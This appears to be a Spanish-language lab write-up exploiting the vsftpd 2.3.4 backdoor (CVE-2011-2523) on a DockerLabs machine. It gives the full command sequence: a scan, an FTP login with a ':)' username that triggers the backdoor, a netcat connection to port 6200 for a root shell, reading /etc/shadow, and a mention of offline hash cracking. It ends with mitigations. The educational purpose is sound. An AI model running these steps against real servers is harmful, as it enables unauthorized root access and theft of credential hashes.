# Writeup: Explotación de Backdoor en vsftpd 2.3.4 (CVE-2011-2523)

**Máquina:** DockerLabs — FirstHacking
**Objetivo:** Obtener acceso root explotando una puerta trasera conocida en vsftpd 2.3.4

---

## 1. Contexto de la vulnerabilidad

En junio de 2011, los servidores que distribuían el código fuente de **vsftpd** (Very Secure FTP Daemon) fueron comprometidos. Un atacante modificó el código fuente oficial e insertó una puerta trasera (backdoor) antes de que el archivo infectado se subiera para su descarga pública. Cualquiera que descargara y compilara esa versión concreta (2.3.4) durante esas horas quedó con un servidor FTP que, además de funcionar con normalidad, escondía una puerta de entrada secreta.

Esta vulnerabilidad está catalogada como **CVE-2011-2523**.

### ¿Cómo funciona el backdoor?

El código malicioso insertado vigilaba el nombre de usuario que un cliente enviaba al intentar loguearse por FTP. Si ese nombre contenía la secuencia de caracteres `:)` (una carita sonriente), el servidor, en lugar de comportarse con normalidad, ejecutaba lo siguiente:

1. Lanzaba un proceso interno.
2. Ese proceso abría un **socket** (un puerto de escucha de red) en el **puerto 6200**.
3. Cualquiera que se conectara a ese puerto obtenía una **shell de sistema con los privilegios del propio servicio** — y como vsftpd corre habitualmente como root, la shell resultante también era root.
4. No había ningún tipo de autenticación en esa shell: el primero en conectar, entraba.

Un detalle clave: el backdoor se dispara **antes** de que el servidor compruebe si la contraseña es correcta. La comprobación del `:)` ocurre en la fase de procesado del nombre de usuario, previa a la validación real de credenciales. Por eso la contraseña introducida después es irrelevante — el daño (la apertura del puerto 6200) ya se ha producido.

> **Analogía:** es como si un guardia de seguridad, al ver un símbolo secreto dibujado en una esquina de tu carnet, te abriera automáticamente una puerta lateral sin comprobar nada más del carnet. No importa qué digas después — la puerta ya está abierta.

---

## 2. Reconocimiento

Se realizó un escaneo completo de puertos con detección de servicios y versiones:

```bash
nmap -sC -sV -p- -T4 172.17.0.2
```

**Resultado:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

Solo hay un puerto abierto: el **21/tcp**, corriendo **vsftpd 2.3.4**. Esta versión exacta es la que contiene el backdoor descrito en la sección anterior, lo que la convierte en el vector de ataque evidente.

---

## 3. Explotación

### Paso 1 — Disparar el backdoor

Se inicia una conexión FTP normal:

```bash
ftp 172.17.0.2
```

Al pedir el nombre de usuario, se introduce una cadena que contenga la secuencia `:)`:

```
Name (172.17.0.2:kali): usuario:)
Password: 1234
```

La contraseña puede ser cualquier cosa, ya que no se llega a validar. Tras enviarla, la conexión queda "colgada" o responde con un error de login — esto es el comportamiento esperado, ya que indica que el backdoor se ha activado internamente.

### Paso 2 — Conectar al puerto del backdoor

Desde otra terminal, se verifica y se conecta al puerto 6200:

```bash
nc -nv 172.17.0.2 6200
```

**Resultado:**

```
(UNKNOWN) [172.17.0.2] 6200 (?) open
```

La conexión se establece correctamente. Esta shell no muestra ningún banner ni prompt visible, pero acepta comandos igualmente.

### Paso 3 — Verificar privilegios

Dentro de la shell obtenida:

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

hostname
# b5d3d5451f0a
```

Confirmado: la shell obtenida tiene privilegios de **root** sin necesidad de autenticación alguna.

---

## 4. Prueba de impacto

Para demostrar de forma objetiva el control total del sistema, se intenta leer un archivo que normalmente solo root puede acceder:

```bash
cat /etc/shadow
```

**Resultado:**

```
root:*:19840:0:99999:7:::
daemon:*:19840:0:99999:7:::
bin:*:19840:0:99999:7:::
...
```

### ¿Por qué este archivo es la prueba definitiva?

`/etc/shadow` almacena los hashes de las contraseñas del sistema y, por diseño, sus permisos son:

```
-rw-r----- 1 root shadow
```

Esto significa que **ni siquiera un usuario normal autenticado** puede leerlo — solo root (o el grupo `shadow`). El razonamiento es:

> Si puedo leer un archivo que por diseño del sistema operativo SOLO puede leer root, no hay duda de que tengo privilegios de root.

En este caso concreto, los hashes aparecen como `*` (cuentas sin contraseña configurada para login directo), por lo que no hay credenciales que extraer. El valor de la prueba no está en el contenido, sino en el hecho de haber conseguido acceso de lectura a un archivo tan restringido.

> En un escenario real con hashes válidos, el siguiente paso habitual sería extraerlos e intentar crackearlos offline con herramientas como `hashcat` o `John the Ripper`, buscando contraseñas reutilizadas en otros servicios (correo, VPN, paneles de administración, etc.).

---

## 5. Resumen de la cadena de ataque

| Fase | Acción | Herramienta |
|---|---|---|
| Reconocimiento | Escaneo de puertos y versión de servicio | `nmap` |
| Identificación | vsftpd 2.3.4 → vulnerable a CVE-2011-2523 | — |
| Explotación | Login FTP con usuario `usuario:)` | `ftp` |
| Post-explotación | Conexión al puerto 6200 abierto por el backdoor | `nc` |
| Verificación | Confirmación de privilegios root | `whoami`, `id` |
| Prueba de impacto | Lectura de archivo restringido a root | `cat /etc/shadow` |

---

## 6. Mitigación

- **Actualizar vsftpd** a una versión posterior a la 2.3.4, donde el backdoor fue eliminado.
- **Verificar la integridad** de los binarios descargados mediante checksums (SHA-256) o firmas GPG antes de compilar software de fuentes de terceros.
- **Monitorizar puertos no estándar** (como el 6200) mediante IDS/IPS o reglas de firewall que alerten sobre conexiones inesperadas.
- **Principio de menor privilegio:** evitar que servicios como FTP corran directamente como root cuando no es estrictamente necesario.

---

## 7. Conclusión

Este laboratorio ilustra un caso real de **compromiso de la cadena de suministro de software** (supply chain attack): no se trata de una vulnerabilidad de diseño o un error de programación, sino de un sabotaje deliberado insertado en el código fuente oficial. Sirve como ejemplo claro de por qué verificar la integridad del software descargado es una práctica de seguridad fundamental, y de lo crítico que puede llegar a ser un servicio mal configurado o desactualizado expuesto a la red.
